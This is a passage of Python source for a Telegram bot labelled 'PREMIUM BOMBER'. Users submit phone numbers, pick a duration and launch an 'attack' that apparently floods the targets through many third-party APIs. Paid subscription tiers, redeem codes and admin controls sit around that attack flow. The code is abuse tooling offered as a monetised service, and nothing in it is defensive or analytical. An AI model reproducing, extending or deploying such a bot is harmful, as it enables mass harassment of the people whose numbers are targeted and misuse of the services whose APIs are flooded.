    elif text in ("📊 /status", "/status"):
        await status_command(update, context)
    elif text in ("👤 /account", "/account"):
        await account_command(update, context)
    elif text in ("💳 /plan", "/plan"):
        await plan_command(update, context)
    elif text in ("🔑 /redeem", "/redeem"):
        await redeem_command(update, context)
    elif text in ("🛡 /protect", "/protect"):
        await protect_command(update, context)
    elif text in ("🔓 /unprotect", "/unprotect"):
        await unprotect_command(update, context)
    elif text in ("📩 /contact", "/contact"):
        await contact_command(update, context)
    elif text in ("❓ /help", "/help"):
        await help_command(update, context)
    elif text == "👑 Admin" and uid == OWNER_ID:
        await show_admin_panel(update, context)
    elif context.user_data.get('waiting_for_target_count'):
        pass
    elif context.user_data.get('waiting_for_numbers') and text.strip():
        await process_numbers(update, context, text)
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        ok, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
        if ok:
            await update.message.reply_text(f"✅ Activated!\n📋 {plan.upper()}\n📅 {exp[:10]}")
        else:
            await update.message.reply_text("❌ Invalid or used code.")
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        await manager.db.protect(uid, text)
        await update.message.reply_text(f"🛡 Protected: {text}")
    elif text == "/cancel":
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem',
                  'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast',
                  'expected_targets', 'waiting_for_contact_msg', 'waiting_for_channel']:
            context.user_data.pop(k, None)
        manager.db.clear_attack_data(uid)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))


async def btn_handler(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await check_channel_join(update, context):
        return
    data = q.data

    if data == "adm_gen_standard" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "standard")
        await q.message.reply_text(f"✅ **STANDARD KEY**\n\n🔑 `{code}`", parse_mode="Markdown")
    elif data == "adm_gen_premium" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "premium")
        await q.message.reply_text(f"✅ **PREMIUM KEY**\n\n🔑 `{code}`", parse_mode="Markdown")
    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
        code = await manager.db.generate_code(30, "ultimate")
        await q.message.reply_text(f"✅ **ULTIMATE KEY**\n\n🔑 `{code}`", parse_mode="Markdown")
    elif data == "adm_custom_key" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await q.message.reply_text("🔑 Send: `days plan_type`\nExample: `30 standard`", parse_mode="Markdown")
    elif data == "adm_give_plan" and uid == OWNER_ID:
        await q.message.reply_text(
            "🎁 **GIVE PLAN**\n\n"
            "**Format:** `/giveplan <user_id> <plan> <days>`\n\n"
            "**Examples:**\n"
            "• `/giveplan 123456789 standard 30`\n"
            "• `/giveplan 123456789 premium 30`\n"
            "• `/giveplan 123456789 ultimate 90`",
            parse_mode="Markdown"
        )
    elif data == "adm_users_list" and uid == OWNER_ID:
        users = await manager.db.get_all_users_with_plan()
        if not users:
            await q.message.reply_text("📭 No users.")
            return
        total = len(users)
        p_users = users[:20]
        msg = f"📋 **USERS** (1/{((total-1)//20)+1})\n👥 Total: **{total}**\n━━━━━━━━━━━━━━━\n\n"
        now = datetime.now()
        for u in p_users:
            plan = "Free"
            exp_s = "N/A"
            if u.get('premium_expiry'):
                try:
                    e = datetime.fromisoformat(u['premium_expiry'])
                    if e > now:
                        plan = (u.get('premium_plan') or 'standard').upper()
                        exp_s = f"{(e - now).days}d"
                    else:
                        plan = "Expired"
                except Exception:
                    pass
            msg += f"🆔 `{u['user_id']}` - {plan} ({exp_s})\n"
        if total > 20:
            msg += f"\n... +{total - 20} more\nUse `/users 2`"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎁 Give Plan", callback_data="adm_give_plan")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="adm_users_refresh")]
        ])
        await q.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)
    elif data == "adm_users_refresh" and uid == OWNER_ID:
        users = await manager.db.get_all_users_with_plan()
        await q.answer(f"Total: {len(users)}", show_alert=True)
    elif data.startswith("give_plan_user_"):
        if uid != OWNER_ID:
            return
        tid = data.replace("give_plan_user_", "")
        await q.message.reply_text(
            f"🎁 **Give plan to `{tid}`**\n\n"
            f"`/giveplan {tid} standard 30`\n"
            f"`/giveplan {tid} premium 30`\n"
            f"`/giveplan {tid} ultimate 30`",
            parse_mode="Markdown"
        )
    elif data.startswith("remove_plan_user_"):
        if uid != OWNER_ID:
            return
        tid = int(data.replace("remove_plan_user_", ""))
        await manager.db.remove_premium(tid)
        await q.message.reply_text(f"✅ Removed plan for `{tid}`", parse_mode="Markdown")
        try:
            await context.bot.send_message(tid, "⚠️ Your plan was removed by admin.")
        except Exception:
            pass
    elif data.startswith("targets_"):
        cnt = int(data.split("_")[1])
        context.user_data['waiting_for_target_count'] = False
        context.user_data['waiting_for_numbers'] = True
        context.user_data['expected_targets'] = cnt
        await q.edit_message_text(f"📞 Send {cnt} phone number(s):\nExample: {' '.join(['9876543210'] * cnt)}")
    elif data.startswith("dur_"):
        targets = manager.db.get_attack_data(uid)
        if not targets:
            await q.edit_message_text("❌ Session expired. /mix again.")
            return
        dur = int(data.split("_")[1])
        ok, msg = await manager.start_attack(uid, targets, dur)
        if ok:
            await q.edit_message_text(
                f"🚀 **ATTACK STARTED!**\n🎯 {', '.join(targets)}\n📊 {len(targets)}\n{msg}",
                parse_mode="Markdown"
            )
        else:
            await q.edit_message_text(f"❌ {msg}")
        manager.db.clear_attack_data(uid)
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
            context.user_data.pop(k, None)
        await q.edit_message_text("❌ Cancelled.")
    elif data == "stop":
        if await manager.stop_attack(uid):
            await q.edit_message_text("🛑 Stopped.")
        else:
            await q.answer("No active attack.")
    elif data == "contact_admin":
        await q.message.reply_text("📩 Send your message. /cancel to cancel.")
        context.user_data['waiting_for_contact_msg'] = True
    elif data.startswith("mark_replied_"):
        if uid != OWNER_ID:
            return
        mid = int(data.split("_")[2])
        await manager.db.reply_contact_message(mid, "Replied")
        await q.message.reply_text(f"✅ #{mid} marked.")
    elif data.startswith("block_user_"):
        if uid != OWNER_ID:
            return
        tid = int(data.split("_")[2])
        await manager.db.block_contact(tid)
        await q.message.reply_text(f"🚫 User {tid} blocked.")
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await q.message.reply_text("📢 Send broadcast message:")
    elif data == "adm_stats" and uid == OWNER_ID:
        u, p, c, pend = await manager.db.get_stats()
        await q.message.reply_text(
            f"📊 **STATS**\n\n👥 Users: {u}\n⭐ Premium: {p}\n🔑 Codes: {c}\n📩 Pending: {pend}\n💎 Owner: `{OWNER_ID}`",
            parse_mode="Markdown"
        )
    elif data == "adm_set_channel" and uid == OWNER_ID:
        context.user_data['waiting_for_channel'] = True
        await q.message.reply_text("📣 Send channel: @yourchannel or t.me/yourchannel")
    elif data == "adm_remove_channel" and uid == OWNER_ID:
        await manager.db.remove_channel()
        await q.message.reply_text("🗑 Channel removed.")
    elif data == "adm_inbox" and uid == OWNER_ID:
        pending = await manager.db.get_pending_contacts()
        if not pending:
            await q.message.reply_text("📭 No pending.")
        else:
            for m in pending[:5]:
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Mark Replied", callback_data=f"mark_replied_{m['id']}")],
                    [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{m['user_id']}")]
                ])
                await q.message.reply_text(f"📩 #{m['id']}\n👤 {m['user_id']}\n💬 {m['message']}", reply_markup=kb)
    elif data == "adm_blocked_users" and uid == OWNER_ID:
        blocked = await manager.db.get_blocked_users()
        if not blocked:
            await q.message.reply_text("📭 No blocked users.")
        else:
            await q.message.reply_text(
                "🚫 **Blocked:**\n" + "\n".join(f"• `{b}`" for b in blocked) + "\n\nUse `/unblock <uid>`",
                parse_mode="Markdown"
            )
    elif data == "adm_check_apis" and uid == OWNER_ID:
        sm = await q.message.reply_text("🔍 Checking APIs... Please wait...")
        try:
            working, failed = await manager.check_working_apis()
            r = f"📊 **API STATUS**\n\n✅ Total: {len(APIS)}\n✅ Working: {len(working)}\n❌ Failed: {len(failed)}\n\n"
            if working:
                r += "**✅ WORKING (Top 30):**\n" + "\n".join(f"{i}. {n}" for i, n in enumerate(working[:30], 1))
            await sm.edit_text(r)
        except Exception as e:
            await sm.edit_text(f"❌ Error: {e}")
    elif data == "info":
        con = await manager.db.get_concurrent_limit(uid)
        await q.answer(f"⚡ {con}x Concurrent\n📡 Total APIs: {len(APIS)}", show_alert=True)


async def cancel_command(update, context):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem',
              'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast',
              'expected_targets', 'waiting_for_contact_msg', 'waiting_for_channel']:
        context.user_data.pop(k, None)
    manager.db.clear_attack_data(uid)
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))


async def shutdown_handler(sig, loop):
    if manager:
        await manager._close_session()
    if db:
        await db.close()
    tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
    [t.cancel() for t in tasks]
    await asyncio.gather(*tasks, return_exceptions=True)
    loop.stop()


# ========== MAIN ==========
def main():
    global db, database, manager

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    # FIX: Initialize database (PostgreSQL preferred, SQLite fallback)
    if HAS_ASYNCPG and DATABASE_URL:
        db = DatabaseStorage(database_url=DATABASE_URL)
        logger.info("✅ Using PostgreSQL database")
    else:
        db = DatabaseStorage(sqlite_path=DB_PATH)
        logger.info(f"✅ Using SQLite database at {DB_PATH}")

    async def init():
        await db.ensure_indexes()
    loop.run_until_complete(init())

    database = DatabaseWrapper()
    manager = AttackManager()

    # Signal handlers (only on Unix)
    try:
        for s in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(s, lambda s=s: asyncio.create_task(shutdown_handler(s, loop)))
    except (NotImplementedError, RuntimeError):
        logger.warning("⚠️ Signal handlers not supported on this platform")

    from telegram.ext import ApplicationBuilder
    app = (ApplicationBuilder()
           .token(BOT_TOKEN)
           .read_timeout(30).write_timeout(30).connect_timeout(30).pool_timeout(30)
           .build())

    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mix", mix_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("account", account_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("contact", contact_command))
    app.add_handler(CommandHandler("reply", reply_command))
    app.add_handler(CommandHandler("inbox", inbox_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("giveplan", giveplan_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("userinfo", userinfo_command))
    app.add_handler(CommandHandler("removeplan", removeplan_command))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(CallbackQueryHandler(btn_handler))

    logger.info("=" * 60)
    logger.info(f"🔥 PREMIUM BOMBER Started")
    logger.info(f"📡 Total APIs: {len(APIS)}")
    logger.info("=" * 60)

    loop.create_task(web_server())

    if USE_WEBHOOK and WEBHOOK_URL:
        app.run_webhook(
            listen="0.0.0.0", port=PORT, url_path=BOT_TOKEN,
            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}", drop_pending_updates=True
        )
    else:
        app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
            
